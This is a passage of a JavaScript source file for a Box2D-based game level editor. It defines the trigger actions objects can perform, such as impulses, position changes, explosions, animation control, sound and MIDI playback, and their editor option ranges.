import {
    B2dEditor
} from "../B2dEditor";
import * as ui from "../utils/ui";
import {
    Settings
} from "../../Settings";
import {
    Key, KeyNames, KeyValLookup
} from "../../../libs/Key";
import {
    game
} from "../../Game";
import { editorSettings } from "../utils/editorSettings";
import * as drawing from '../utils/drawing'
import * as AudioManager from '../../utils/AudioManager'
import { applyColorMatrix } from "../utils/colorMatrixParser";
import * as EffectsComposer from '../../utils/EffectsComposer';
import { MidiPlayer } from '../../utils/MidiPlayer';
import { b2AddVec2, b2CloneVec2, b2LinearStiffness, b2MulVec2, b2SubVec2 } from "../../../libs/debugdraw";
import { isBodyGroup, setBodyGroupOpacity } from "../utils/groupEditing";
import { disableCulling } from "../../utils/PIXICuller";
import { crawlJointsUtility } from "../../prefabs/level/Finish";

const { getPointer, NULL } = Box2D;

const vec1 = new Box2D.b2Vec2();
const vec2 = new Box2D.b2Vec2();
const vec3 = new Box2D.b2Vec2();
const vec4 = new Box2D.b2Vec2();

export const getActionsForObject = function (object) {
    var actions = [];
    actions.push("Empty");
    if (object.data.prefabInstanceName != undefined) {
        const prefab = B2dEditor.activePrefabs[object.data.prefabInstanceName];
        if(!prefab.class.isSevenSegment && !prefab.class.isAnimator) actions.push("Impulse");
        if(prefab.class.isExplosive){
            actions.push("SetActive");
            actions.push("Explode");
        }
        if(prefab.class.isCrossBow || prefab.class.isCannon){
            actions.push("Shoot");
        }
        if(prefab.class.isVehicle){
            actions.push("DealDamage");
            actions.push("SetColorMatrix");
            actions.push("SetFlipped");

        }
        if(prefab.class.isJet){
            actions.push("EngineOn");
        }
        if(prefab.class.isDrone){
            actions.push("SetWayPoint");
        }
        if(prefab.class.isSevenSegment){
            actions.push("Increase");
            actions.push("Decrease");
            actions.push("SetNumber");
            actions.push("SetRandom");
        }
        if(prefab.class.isExplosive){
            actions.push("SetActive");
            actions.push("Explode");
        }
        if(prefab.class.isAnimator){
            actions.push("SetProgress");
            actions.push("SetClockwise");
            actions.push("SetAnimating");
            actions.push("SetDuration");
        }
        if(prefab.class.isNPC){
            actions.push('SetAwake');
            actions.push('SetInteractivity');
        }
    } else {
        switch (object.data.type) {
            case B2dEditor.object_BODY:
                actions.push("Impulse") //, "SetAwake");
                actions.push("SetCameraTarget");
                actions.push("SetCollision");
                actions.push("SetStatic");

                if(object.myBody.myTexture){
                    if(object.myBody.myTexture.data.type === B2dEditor.object_ANIMATIONGROUP){
                        actions.push("Pause");
                        actions.push("Play");
                        actions.push("GotoAndPlay");
                        actions.push("GotoAndStop");
                        actions.push("Nextframe");
                        actions.push("Prevframe");
                        actions.push("animationFPS");
                        actions.push("SetMirrored");
                    }else if(object.myBody.myTexture.data.type === B2dEditor.object_GRAPHICGROUP){
                        actions.push("SetMirrored");
                    }else if(object.myBody.myTexture.data.type === B2dEditor.object_GRAPHIC){
                        actions.push("SetMirrored");
                    }
                }

                break;
            case B2dEditor.object_JOINT:
                if (object.data.jointType == B2dEditor.jointObject_TYPE_PIN || object.data.jointType == B2dEditor.jointObject_TYPE_SLIDE || object.data.jointType == B2dEditor.jointObject_TYPE_WHEEL) {
                    actions.push("MotorEnabled", "LimitEnabled", "SetMotorSpeed", "SetMaxMotorTorque");
                }
                if (object.data.jointType == B2dEditor.jointObject_TYPE_PIN) actions.push("SetAngleLimits");
                if (object.data.jointType == B2dEditor.jointObject_TYPE_SLIDE) actions.push("SetDistanceLimits");
                if (object.data.jointType == B2dEditor.jointObject_TYPE_DISTANCE || object.data.jointType == B2dEditor.jointObject_TYPE_WHEEL) actions.push("SetSpring");
                //slide joint: MotorEnabled, LimitEnabled, SetMotorSpeed, SetLimits, Destroy
                break;
                // B2dEditor.object_TEXTURE = 1;
                // B2dEditor.object_JOINT = 2;
                // B2dEditor.object_UNDO_MOVEMENT = 3;
                // B2dEditor.object_PREFAB = 4;
                // B2dEditor.object_MULTIPLE = 5;
                // B2dEditor.object_GRAPHIC = 6;
                // B2dEditor.object_GRAPHICGROUP = 7;
                // B2dEditor.object_TRIGGER = 8;
            case B2dEditor.object_TRIGGER:
                actions.push("SetEnabled");
                actions.push("SetFollowPlayer");
                actions.unshift("Trigger");
                break
            case B2dEditor.object_ANIMATIONGROUP:
                actions.push("Pause");
                actions.push("Play");
                actions.push("GotoAndPlay");
                actions.push("GotoAndStop");
                actions.push("Nextframe");
                actions.push("Prevframe");
                actions.push("animationFPS");
                actions.push("SetMirrored");
                break;
            case B2dEditor.object_GRAPHIC:
            case B2dEditor.object_GRAPHICGROUP:
                actions.push("SetMirrored");
                actions.push("SetColorMatrix");
                break;
            default:
                break;
        }
    }
    if (object.data.type != B2dEditor.object_JOINT) {
        actions.push("SetPosition", "SetRotation", "SetVisibility", "SetOpacity")
    }
    actions.push("Destroy");
    return actions;
}
const getWorldActions = ()=> ["SetGravity", "SetCameraZoom", "ResetCameraTarget", ACTION_GAME_WIN, ACTION_GAME_LOSE, "SetGameSpeed", "SetCameraColorMatrix", "PlaySFX", "MidiControls", "PlayMidiInstrument", "SetScreenShake"];

export const getAction = function (action) {
    return JSON.parse(JSON.stringify(actionDictionary[`actionObject_${action}`]));
}
export const getActionOptions = function (action) {
    return actionDictionary[`actionOptions_${action}`];
}

export const doAction = function (actionData, target) {

    let bodies;
    const prefab = (target && target.data) ? B2dEditor.activePrefabs[target.data.prefabInstanceName] : undefined;
    let objects;
    let animation;

    switch (actionData.type) {
        case "Impulse":
                if (target.data.prefabInstanceName) {
                    bodies = B2dEditor.lookupGroups[target.data.prefabInstanceName]._bodies;
                } else bodies = [target.myBody];
                bodies.forEach(body => {
                    let a = actionData.direction * B2dEditor.DEG2RAD;
                    if(actionData.relative){
                        a += body.GetAngle();
                    }

                    //actionData.impulseForce these are legacy properties, still some levels have them.
                    //actionData.rotationForce

                    const impulseReducer = 20;
                    const mass = body.GetMass() || 1;

                    if(actionData.linearForce === undefined){ // legacy fix
                        actionData.linearForce = (actionData.impulseForce * impulseReducer) / mass;
                    }

                    const force = actionData.linearForce * mass / impulseReducer;
                    const impulse = vec1;
                    impulse.Set(force * Math.cos(a), force * Math.sin(a))
                    body.ApplyLinearImpulse(impulse, body.GetPosition(), true)

                    if(actionData.rotationalForce === undefined){  // legacy fix
                        actionData.rotationalForce = actionData.rotationForce / mass / impulseReducer;
                    }

                    const rotationForce = actionData.rotationalForce * mass * impulseReducer;
                    body.ApplyTorque(rotationForce, true)
                });
            break;
        case "SetPosition":
                let targetPos = vec1;
                if (target.data.prefabInstanceName) {

                    if(prefab.class.isVehicle){
                        objects = prefab.class.getCurrentActiveBodies();

                    }else{
                        objects = [].concat(prefab.class.lookupObject._bodies, prefab.class.lookupObject._textures);
                    }
                    targetPos.Set(target.x, target.y);
                } else if (target.myBody) {
                    objects = [target.myBody];
                    targetPos.Set(target.myBody.GetPosition().x * Settings.PTM, target.myBody.GetPosition().y * Settings.PTM);
                    target.myBody.SetAwake(true);
                } else {
                    objects = [target];
                    targetPos.Set(target.x, target.y);
                }

                if (actionData.setAdd == "fixed"){
                    targetPos.Set(actionData.X - targetPos.x, actionData.Y - targetPos.y)
                } else {
                    targetPos.Set(actionData.X, actionData.Y);
                }

                B2dEditor.applyToObjects(B2dEditor.TRANSFORM_MOVE, targetPos, objects);
            break;
        case "SetRotation":
                let targetRotation;

                if (target.data.prefabInstanceName) {
                    objects = [].concat(B2dEditor.lookupGroups[target.data.prefabInstanceName]._bodies, B2dEditor.lookupGroups[target.data.prefabInstanceName]._textures);
                    targetRotation = target.rotation;
                } else if (target.myBody) {
                    objects = [target.myBody];
                    targetRotation = target.myBody.GetAngle();
                } else {
                    objects = [target];
                    targetRotation = target.rotation;
                }
                targetRotation *= game.editor.RAD2DEG;

                if (actionData.setAdd == "fixed") targetRotation = actionData.rotation-targetRotation;
                else targetRotation = actionData.rotation;

                B2dEditor.applyToObjects(B2dEditor.TRANSFORM_ROTATE, targetRotation, objects);
            break;
        case "SetVisibility":
            if (target.myBody) {
                if(target.myBody.myTexture){

                    if(!actionData.setVisible){
                        disableCulling(target.myBody.myTexture);
                    }

                    target.myBody.myTexture.renderable = actionData.setVisible;
                    target.myBody.myTexture.forceRenderable = actionData.setVisible;
                }
                if(!actionData.setVisible){
                    disableCulling(target);
                }
                target.renderable = actionData.setVisible;
                game.editor.updateBodyPosition(target.myBody);
            }else{
                if(!actionData.setVisible){
                    disableCulling(target);
                }

                target.renderable = actionData.setVisible;
                target.forceRenderable = actionData.setVisible;
            }
            if(actionData.toggle) actionData.setVisible = !actionData.setVisible;
            break;
        case "MotorEnabled":
            target.EnableMotor(actionData.enabled);
            break;
        case "LimitEnabled":
            target.EnableLimit(actionData.enabled);
            break;
        case "SetAngleLimits":
            target.SetLimits(actionData.lowerAngle * game.editor.DEG2RAD, actionData.upperAngle * game.editor.DEG2RAD);
            break;
        case "SetDistanceLimits":
            target.SetLimits(actionData.lowerLimit, actionData.upperLimit);
            break;
        case "SetMotorSpeed":
            let targetMotorSpeed;
            if (actionData.setAdd == "fixed") targetMotorSpeed = actionData.speed;
            else if (actionData.setAdd == "add") targetMotorSpeed = target.GetMotorSpeed() + actionData.speed;
            targetMotorSpeed = Math.min(Settings.motorSpeedLimit, Math.max(-Settings.motorSpeedLimit, targetMotorSpeed));
            target.SetMotorSpeed(targetMotorSpeed);
            break;
        case "SetMaxMotorTorque":
            let targetMotorForce;
            if(target.SetMaxMotorTorque){
                if (actionData.setAdd == "fixed") targetMotorForce = actionData.force;
                else if (actionData.setAdd == "add") targetMotorForce = target.GetMaxMotorTorque() + actionData.force;
                targetMotorForce = Math.min(Settings.motorForceLimit, Math.max(0, targetMotorForce));
                target.SetMaxMotorTorque(targetMotorForce);
            }else if(target.SetMaxMotorForce){
                if (actionData.setAdd == "fixed") targetMotorForce = actionData.force;
                else if (actionData.setAdd == "add") targetMotorForce = target.GetMaxMotorForce() + actionData.force;
                targetMotorForce = Math.min(Settings.motorForceLimit, Math.max(0, targetMotorForce));
                target.SetMaxMotorForce(targetMotorForce);
            }
            break;
        case "SetSpring":
            b2LinearStiffness(target, actionData.frequencyHz, actionData.dampingRatio, target.GetBodyA(), target.GetBodyB(), true);
            break;
        case "Destroy":
            const toDestroy = prefab || target.myBody || target;
            if(prefab) prefab.class.destroy();
            else B2dEditor.deleteObjects([toDestroy]);
            break;
        case "SetActive":
            prefab.class.set('active', actionData.active);
            break;
        case "Explode":
            prefab.class.explode();
            break;
        case "Shoot":
            prefab.class.setShouldShoot();
            break;
        case "SetEnabled":
            target.data.enabled = actionData.setEnabled;
            if(actionData.toggle) actionData.setEnabled = !actionData.setEnabled;
            if(!target.data.enabled) target.myBody.class.actionQueue.length = 0;
            target.myBody.class.setEnabled(target.data.enabled);
            break;
        case "SetFollowPlayer":
            target.data.followPlayer = actionData.setFollowPlayer;
            if(target.data.followPlayer) target.data.followFirstTarget = false;
            if(actionData.toggle) actionData.setFollowPlayer = !actionData.setFollowPlayer;
            break;
        case "SetGravity":
            const gravity = vec1;
            gravity.Set(actionData.gravityX, actionData.gravityY);
            game.world.SetGravity(gravity);
            break;
        case "SetCameraZoom":
            game.editor.editorSettingsObject.cameraZoom = actionData.zoom;
            break;
        case "SetGameSpeed":
            game.editor.editorSettingsObject.gameSpeed = actionData.gameSpeed;
            break;
        case "DealDamage":
            prefab.class.character.dealDamage(actionData.damage);
            break;
        case "EngineOn":
            prefab.class.engineOn = actionData.engineOn;
            if(actionData.toggle) actionData.engineOn = !actionData.engineOn;
            break;
        case "Trigger":
            target.myBody.class.activateTrigger();
            break;
        case "ResetCameraTarget":
            game.cameraFocusObject = game.cameraFocusCharacterObject;
        break;
        case "SetCameraTarget":
            game.cameraFocusObject = target.myBody;
        break
        case "Pause":
            animation = target;
            if (target.myBody && target.myBody.myTexture) animation = target.myBody.myTexture;
            animation.playing = false;
        break
        case "Play":
            animation = target;
            if (target.myBody && target.myBody.myTexture) animation = target.myBody.myTexture;
            animation.playing = true;
        break
        case "GotoAndStop":
            animation = target;
            if (target.myBody && target.myBody.myTexture) animation = target.myBody.myTexture;
            animation.setFrame(actionData.frame);
            animation.playing = false;
        break
        case "GotoAndPlay":
            animation = target;
            if (target.myBody && target.myBody.myTexture) animation = target.myBody.myTexture;
            animation.setFrame(actionData.frame);
            animation.playing = true;
        break
        case "Nextframe":
            animation = target;
            if (target.myBody && target.myBody.myTexture) animation = target.myBody.myTexture;
            animation.nextFrame();
        break
        case "Prevframe":
            animation = target;
            if (target.myBody && target.myBody.myTexture) animation = target.myBody.myTexture;
            animation.prevFrame();
        break
        case "animationFPS":
            animation = target;
            if (target.myBody && target.myBody.myTexture) animation = target.myBody.myTexture;
            animation.frameTime = 1000 / actionData.fps;
        break
        case "SetWayPoint":
            if(!prefab.class.wayPoint){
                prefab.class.wayPoint = new Box2D.b2Vec2(actionData.x, actionData.y);
            } else {
                prefab.class.wayPoint.Set(actionData.x, actionData.y);
            }

            b2MulVec2(prefab.class.wayPoint, 1/game.editor.PTM);
        break;
        case "SetMirrored":
            animation = target;
            if (target.myBody && target.myBody.myTexture) animation = target.myBody.myTexture;
            const currentScale = Math.abs(animation.scale.x);
            animation.scale.x = actionData.setMirrored ? -currentScale : currentScale;
            animation.data.mirrored = actionData.setMirrored;
            if(actionData.toggle) actionData.setMirrored = !actionData.setMirrored;
            break;
        case ACTION_GAME_WIN:
            game.gameWin();
        break;
        case ACTION_GAME_LOSE:
            game.gameLose();
        break;
        case "SetCollision":
            if(target.myBody) game.editor.setBodyCollision(target.myBody, [Settings.collisionTypes.indexOf(actionData.collision)]);
        break;
        case "SetStatic":
            if(target.myBody){
                const type = actionData.setStatic ? Box2D.b2_staticBody : Box2D.b2_dynamicBody;
                target.myBody.SetType(type);
                if(actionData.toggle) actionData.setStatic = !actionData.setStatic;
            }
        break;
        case "PlaySFX":
            playTriggerSound(actionData, target.trigger.GetPosition());
        break
        case "SetCameraColorMatrix":
            applyColorMatrix(game.editor.container, actionData.colorMatrix);
        break;
        case "SetColorMatrix":
            if(prefab) prefab.class.applyColorMatrix(actionData.colorMatrix);
            else applyColorMatrix(target, actionData.colorMatrix);
        break;
        case "MidiControls":
            switch(actionData.action){
                case 'play':
                    MidiPlayer.play();
                    break;
                case 'stop':
                    MidiPlayer.stop();
                    break;
            }
            break;
        case "PlayMidiInstrument":
            playTriggerInstrument(actionData);
        break;
        case "Increase":
            prefab.class.increase();
        break;
        case "Decrease":
            prefab.class.decrease();
        break;
        case "SetNumber":
            prefab.class.setNumber(actionData.number);
        break;
        case "SetRandom":
            prefab.class.setNumber(Math.floor(Math.random() * 10));
        break;
        case "SetProgress":
            prefab.class.setProgress(actionData.progress);
        break;
        case "SetClockwise":
            prefab.class.setClockwise(actionData.setClockwise);
            if(actionData.toggle) actionData.setClockwise = !actionData.setClockwise;
        break
        case "SetAnimating":
            prefab.class.animating = actionData.setAnimating;
            if(actionData.toggle) actionData.setAnimating = !actionData.setAnimating;
        break
        case "SetDuration":
            prefab.class.setDuration(actionData.duration * 1000);
        break;
        case "SetScreenShake":
            if(game.cameraFocusObject){
                const pixiPoint = game.editor.getPIXIPointFromWorldPoint(game.cameraFocusObject);
                EffectsComposer.addEffect(EffectsComposer.effectTypes.screenShake, {amplitude:actionData.amplitude, point:pixiPoint});
            }
        break;
        case "SetOpacity":
            let targetOpacity;

            if (actionData.setAdd == "fixed") targetOpacity = actionData.opacity;
            else{
                if (target.myBody) {
                    if(isBodyGroup(target.myBody)){
                        targetOpacity = target.data.groupOpacity;
                    }else{
                        targetOpacity = target.alpha
                    }
                } else {
                    targetOpacity = target.alpha
                }

                if(actionData.setAdd === "add"){
                    targetOpacity += actionData.opacity;
                }else{
                    targetOpacity -= actionData.opacity;
                }
            }

            targetOpacity = Math.max(0, Math.min(1.0, targetOpacity));

            if (target.myBody) {
                if(isBodyGroup(target.myBody)){
                    target.data.groupOpacity = targetOpacity;
                    setBodyGroupOpacity(target.myBody, target.data.groupOpacity);
                }else{
                    target.alpha = targetOpacity
                }
            } else {
                target.alpha = targetOpacity;
            }
        break;
        case "SetFlipped":
            if(prefab.class.flipped !== actionData.flipped){
                prefab.class.flip();
            }
            if(actionData.toggle) actionData.flipped = !actionData.flipped;
        break;
        case "SetInteractivity":
            if(actionData.interactivity === 'interactive'){
                prefab.class.character.invincible = false;
                prefab.class.character.dollMode = false;
            }else if(actionData.interactivity === 'invincible'){
                prefab.class.character.invincible = true;
                prefab.class.character.dollMode = false;
            }else if(actionData.interactivity === 'non-interactive'){
                prefab.class.character.invincible = true;
                prefab.class.character.dollMode = true;
            }

            if(actionData.interactivity === 'non-interactive'){
                prefab.class.character.lookupObject._bodies.forEach(body => {
                    game.editor.setBodyCollision(body, [2]);
                })
            }else{
                prefab.class.character.lookupObject._bodies.forEach(body => {
                    game.editor.setBodyCollision(body, body.mySprite.data.collision);
                });

                game.editor.setBodyCollision(prefab.class.character.lookupObject.eye_left, [1]);
                game.editor.setBodyCollision(prefab.class.character.lookupObject.eye_right, [1]);
            }

        break;
        case "SetAwake":
            if (target.data.prefabInstanceName) {
                prefab.class.isAwake = actionData.isAwake;
                
                const targetBodies = crawlJointsUtility(prefab.class.character.lookupObject._bodies[0], () => true);
                targetBodies.push(prefab.class.character.lookupObject._bodies[0]);
                targetBodies.forEach(body => {
                    body.SetAwake(actionData.isAwake);
                })
            }
            if(actionData.toggle) actionData.isAwake = !actionData.isAwake;
        break;
    }
}
export const guitype_MINMAX = 0;
export const guitype_LIST = 1;
export const guitype_BOOL = 2;
export const guitype_UNIQUE_BOOL = 3;
export const guitype_FUNCTION = 4;
export const guitype_UNLISTED = 5;
export const guitype_ROTATION = 6;

export const actionDictionary = {
    //*** IMPULSE ***/
    actionObject_Impulse: {
        type: "Impulse",
        linearForce: 0,
        relative: false,
        direction: 270,
        rotationalForce: 0,
    },
    actionOptions_Impulse: {
        linearForce: {
            type: guitype_MINMAX,
            min: 0,
            max: 1000,
            value: 0,
            step: 1,
        },
        relative: {
            type: guitype_BOOL,
        },
        direction: {
            type: guitype_ROTATION,
            min: 0,
            max: 360,
            value: 270,
            step: 0.1,
        },
        rotationalForce: {
            type: guitype_MINMAX,
            min: -1000,
            max: 1000,
            value: 0,
            step: 1
        },

        impulseForce: {
            type: guitype_MINMAX,
            min: 0,
            max: 100000,
            value: 0,
            step: 1,
        },

        rotationForce: {
            type: guitype_MINMAX,
            min: -10000,
            max: 10000,
            value: 0,
            step: 1
        },
    },
    /******************/
    actionObject_SetPosition: {
        type: 'SetPosition',
        setAdd: 'fixed',
        X: 0,
        Y: 0,
    },
    actionOptions_SetPosition: {
        setAdd: {
            type: guitype_LIST,
            items: ['fixed', 'add'],
        },
        X: {
            type: guitype_MINMAX,
            min: -editorSettings.worldSize.width,
            max: editorSettings.worldSize.width,
            step: 0.1,
        },
        Y: {
            type: guitype_MINMAX,
            min: -editorSettings.worldSize.width,
            max: editorSettings.worldSize.width,
            step: 0.1
        },
    },
    /*******************/
    actionObject_SetRotation: {
        type: 'SetRotation',
        setAdd: 'fixed',
        rotation: 0,
    },
    actionOptions_SetRotation: {
        setAdd: {
            type: guitype_LIST,
            items: ['fixed', 'add'],
        },
        rotation: {
            type: guitype_MINMAX,
            min: -360,
            max: 360,
            step: 0.1,
        },
    },
    /*******************/
    actionObject_SetVisibility: {
        type: 'SetVisibility',
        toggle: false,
        setVisible: true,
    },
    actionOptions_SetVisibility: {
        toggle: {
            type: guitype_BOOL,
        },
        setVisible: {
            type: guitype_BOOL,
        },
    },
    /*******************/
    actionObject_MotorEnabled: {
        type: 'MotorEnabled',
        enabled: true,
    },
    actionOptions_MotorEnabled: {
        enabled: {
            type: guitype_BOOL,
        },
    },
    /*******************/
    actionObject_LimitEnabled: {
        type: 'LimitEnabled',
        enabled: true,
    },
    actionOptions_LimitEnabled: {
        enabled: {
            type: guitype_BOOL,
        },
    },
    /*******************/
    actionObject_SetMotorSpeed: {
        type: 'SetMotorSpeed',
        setAdd: 'fixed',
        speed: 0,
    },
    actionOptions_SetMotorSpeed: {
        setAdd: {
            type: guitype_LIST,
            items: ['fixed', 'add'],
        },
        speed: {
            type: guitype_MINMAX,
            min: -Settings.motorSpeedLimit,
            max: Settings.motorSpeedLimit,
            step: 0.1,
        },
    },
    /*******************/
    actionObject_SetAngleLimits: {
        type: 'SetAngleLimits',
        upperAngle: 0,
        lowerAngle: 0,
    },
    actionOptions_SetAngleLimits: {
        upperAngle: {
            type: guitype_MINMAX,
            min: 0,
            max: 180,
            step: 0.1,
        },
        lowerAngle: {
            type: guitype_MINMAX,
            min: -180,
            max: 0,
            step: 0.1
        },
    },
    /*******************/
    actionObject_SetDistanceLimits: {
        type: 'SetDistanceLimits',
        upperLimit: 0,
        lowerLimit: 0,
    },
    actionOptions_SetDistanceLimits: {
        upperLimit: {
            type: guitype_MINMAX,
            min: 0,
            max: Settings.slideJointDistanceLimit,
            step: 0.1,
        },
        lowerLimit: {
            type: guitype_MINMAX,
            min: -Settings.slideJointDistanceLimit,
            max: 0,
            step: 0.1
        },
    },
    /*******************/
    actionObject_SetMaxMotorTorque: {
        type: 'SetMaxMotorTorque',
        setAdd: 'fixed',
        force: 0,
    },
    actionOptions_SetMaxMotorTorque: {
        setAdd: {
            type: guitype_LIST,
            items: ['fixed', 'add'],
        },
        force: {
            type: guitype_MINMAX,
            min: 0,
            max: Settings.motorForceLimit,
            step: 0.1,
        },
    },
    /*******************/
    actionObject_SetSpring: {
        type: 'SetSpring',
        frequencyHz:0,
        dampingRatio:0,
    },
    actionOptions_SetSpring: {
        frequencyHz: {
            type: guitype_MINMAX,
            min: 0,
            max: 10,
            step: 0.1,
        },
        dampingRatio: {
            type: guitype_MINMAX,
            min: 0.0,
            max: 1.0,
            step: 0.1,
        },
    },
    /*******************/
    actionObject_Destroy: {
        type: 'Destroy',
    },
    actionOptions_Destroy: {},
    /*******************/
    actionObject_SetActive: {
        type: 'SetActive',
        active: true,
    },
    actionOptions_SetActive: {
        active: {
            type: guitype_BOOL,
        },
    },
    /*******************/
    actionObject_Explode: {
        type: 'Explode',
    },
    actionOptions_Explode: {},
    /*******************/
    actionObject_Shoot: {
        type: 'Shoot',
    },
    actionOptions_Shoot: {},
    /*******************/
    actionObject_SetEnabled: {
        type: 'SetEnabled',
        toggle: false,
        setEnabled: true,
    },
    actionOptions_SetEnabled: {
        toggle: {
            type: guitype_BOOL,
        },
        setEnabled: {
            type: guitype_BOOL,
        },
    },
    /*******************/
    actionObject_SetFollowPlayer: {
        type: 'SetFollowPlayer',
        toggle: false,
        setFollowPlayer: false,
    },
    actionOptions_SetFollowPlayer: {
        toggle: {
            type: guitype_BOOL,
        },
        setFollowPlayer: {
            type: guitype_BOOL,
        },
    },
    /*******************/
    actionObject_SetGravity: {
        type: "SetGravity",
        gravityX: 0,
        gravityY: 10,
    },
    actionOptions_SetGravity: {
        gravityX: {
            type: guitype_MINMAX,
            min: -20,
            max: 20,
            value: 0,
            step: 0.1,
        },
        gravityY: {
            type: guitype_MINMAX,
            min: -20,
            max: 20,
            value: 0,
            step: 0.1,
        }
    },
    /******************/
    actionObject_SetCameraZoom: {
        type: "SetCameraZoom",
        zoom: Settings.defaultCameraZoom,
    },
    actionOptions_SetCameraZoom: {
        zoom: {
            type: guitype_MINMAX,
            min: 0.1,
            max: 2.0,
            value: Settings.defaultCameraZoom,
            step: 0.1,
        },
    },
    /******************/
    actionObject_SetGameSpeed: {
        type: "SetGameSpeed",
        gameSpeed: 1.0,
    },
    actionOptions_SetGameSpeed: {
        gameSpeed: {
            type: guitype_MINMAX,
            min: 0.1,
            max: 2.0,
            value: 1.0,
            step: 0.1,
        },
    },
    /******************/
    actionObject_DealDamage: {
        type: "DealDamage",
        damage: 10,
    },
    actionOptions_DealDamage: {
        damage: {
            type: guitype_MINMAX,
            min: 0.1,
            max: 10000,
            value: 10,
            step: 0.1,
        },
    },
    /******************/
    actionObject_EngineOn: {
        type: 'EngineOn',
        toggle: false,
        engineOn: true,
    },
    actionOptions_EngineOn: {
        toggle: {
            type: guitype_BOOL,
        },
        engineOn: {
            type: guitype_BOOL,
        },
    },
    /*******************/
    actionObject_Empty: {
        type: 'Empty',
    },
    /*******************/
    actionObject_Trigger: {
        type: 'Trigger',
    },
    /******************/
    actionObject_SetCameraTarget: {
        type: 'SetCameraTarget',
    },
    /*******************/
    actionObject_ResetCameraTarget: {
        type: 'ResetCameraTarget',
    },
    /*******************/
    actionObject_Pause: {
        type: 'Pause',
    },
    /*******************/
    actionObject_Play: {
        type: 'Play',
    },
    /*******************/
    actionObject_GotoAndPlay: {
        type: 'GotoAndPlay',
        frame: 1,
    },
    actionOptions_GotoAndPlay: {
        frame: {
            type: guitype_MINMAX,
            min: 1,
            max: Settings.maxAnimationFrames,
            value: 1,
            step: 1,
        },
    },
    /*******************/
    actionObject_GotoAndStop: {
        type: 'GotoAndStop',
        frame: 1,
    },
    actionOptions_GotoAndStop: {
        frame: {
            type: guitype_MINMAX,
            min: 1,
            max: Settings.maxAnimationFrames,
            value: 1,
            step: 1,
        },
    },
    /*******************/
    actionObject_Nextframe: {
        type: 'Nextframe',
    },
    /*******************/
    actionObject_Prevframe: {
        type: 'Prevframe',
    },
    /*******************/
    actionObject_animationFPS: {
        type: 'animationFPS',
        fps: 30,
    },
    actionOptions_animationFPS: {
        fps: {
            type: guitype_MINMAX,
            min: 1,
            max: 60,
            value: 30,
            step: 1,
        },
    },
    /*******************/
    actionObject_SetWayPoint: {
        type: 'SetWayPoint',
        x: 0,
        y: 0,
    },
    actionOptions_SetWayPoint: {
        x: {
            type: guitype_MINMAX,
            min: -editorSettings.worldSize.width,
            max: editorSettings.worldSize.width,
            value: 0,
            step: 0.1,
        },
        y: {
            type: guitype_MINMAX,
            min: -editorSettings.worldSize.width,
            max: editorSettings.worldSize.width,
            value: 0,
            step: 0.1,
        },
    },
    /*******************/
    actionObject_SetMirrored: {
        type: 'SetMirrored',
        toggle: false,
        setMirrored: true,
    },
    actionOptions_SetMirrored: {
        toggle: {
            type: guitype_BOOL,
        },
        setMirrored: {
            type: guitype_BOOL,
        },
    },
    /*******************/
    actionObject_SetWin: {
    type: 'SetWin',
    },
    actionOptions_SetWin: {},
    /*******************/
    actionObject_SetLose: {
        type: 'SetLose',
    },
    actionOptions_SetLose: {},
    /*******************/
    actionObject_SetCollision: {
        type: 'SetCollision',
        collision: Settings.collisionTypes[0],
    },
    actionOptions_SetCollision: {
        collision: {
            type: guitype_LIST,
            items: Settings.collisionTypes.filter(collision => collision !== "Is character"),
        },
    },
    /*******************/
    actionObject_SetStatic: {
        type: 'SetStatic',
        toggle: false,
        setStatic: true,
    },
    actionOptions_SetStatic: {
        toggle: {
            type: guitype_BOOL,
        },
        setStatic: {
            type: guitype_BOOL,
        },
    },
    /*******************/
    actionObject_PlaySFX: {
        type: 'PlaySFX',
        file: '',
        test: 'function',
        stop: 'function',
        volume: 1.0,
        local: false,
        pitch:1.0,
        randomPitchOffset:0,
    },
    actionOptions_PlaySFX: {
        file: {
            type: guitype_LIST,
            items: AudioManager.getAvailableAudioSprites()
        },
        volume: {
            type: guitype_MINMAX,
            min: 0,
            max: 2.0,
            value: 1.0,
            step: 0.1,
        },
        local: {
            type: guitype_BOOL,
        },
        pitch: {
            type: guitype_MINMAX,
            min: 0.1,
            max: 4.0,
            value: 1.0,
            step: 0.1,
        },
        randomPitchOffset: {
            type: guitype_MINMAX,
            min: 0,
            max: 1.0,
            value: 0,
            step: 0.1,
        },
        test: {
            type: guitype_FUNCTION,
            function: action =>{playTriggerSound(action);}
        },
        stop: {
            type: guitype_FUNCTION,
            function: action =>{AudioManager.stopAllSounds()}
        }
    },
    /******************/
    actionObject_SetCameraColorMatrix: {
        type: 'SetCameraColorMatrix',
        colorMatrix: [0],
        setColorMatrix: 'function',
    },
    actionOptions_SetCameraColorMatrix: {
        colorMatrix: guitype_UNLISTED,
        setColorMatrix: {
            type: guitype_FUNCTION,
            function: action =>{
                game.editor.ui.showColorMatrixEditor(action.colorMatrix, [], cm =>{
                    action.colorMatrix = cm;
                })
            }
        },
    },
    /******************/
    actionObject_SetColorMatrix: {
        type: 'SetColorMatrix',
        colorMatrix: [0],
        setColorMatrix: 'function',
    },
    actionOptions_SetColorMatrix: {
        colorMatrix: guitype_UNLISTED,
        setColorMatrix: {
            type: guitype_FUNCTION,
            function: action =>{
                game.editor.ui.showColorMatrixEditor(action.colorMatrix, [], cm =>{
                    action.colorMatrix = cm;
                })
            }
        },
    },
    /******************/
    actionObject_MidiControls: {
        type: 'MidiControls',
        action: 'play',
    },
    actionOptions_MidiControls: {
        action:{
            type: guitype_LIST,
            items: ['play', 'stop'],
        }
    },
    /*******************/
    actionObject_PlayMidiInstrument: {
        type: 'PlayMidiInstrument',
        instrument: '',
        test: 'function',
        note: MidiPlayer.midiKeys[0],
        bpm: 116,
        length: '1',
    },
    actionOptions_PlayMidiInstrument: {
        instrument: {
            type: guitype_LIST,
            items: MidiPlayer.instruments
        },
        note: {
            type: guitype_LIST,
            items: MidiPlayer.midiKeys
        },
        bpm: {
            type: guitype_MINMAX,
            min: 60,
            max: 200,
            value: 116,
            step: 1,
        },
        length: {
            type: guitype_LIST,
            items: MidiPlayer.keyLengths
        },
        test: {
            type: guitype_FUNCTION,
            function: action =>{playTriggerInstrument(action);}
        },
    },
    /******************/

    actionObject_Increase: {
    type: 'Increase',
    },
    actionOptions_Increase: {},
    /*******************/
    actionObject_Decrease: {
        type: 'Decrease',
    },
    actionOptions_Decrease: {},
    /*******************/
    actionObject_SetNumber: {
        type: 'SetNumber',
        number: 0,
    },
    actionOptions_SetNumber: {
        number: {
            type: guitype_MINMAX,
            min: 0,
            max: 9,
            value: 0,
            step: 1,
        }
    },
    /*******************/
    actionObject_SetRandom: {
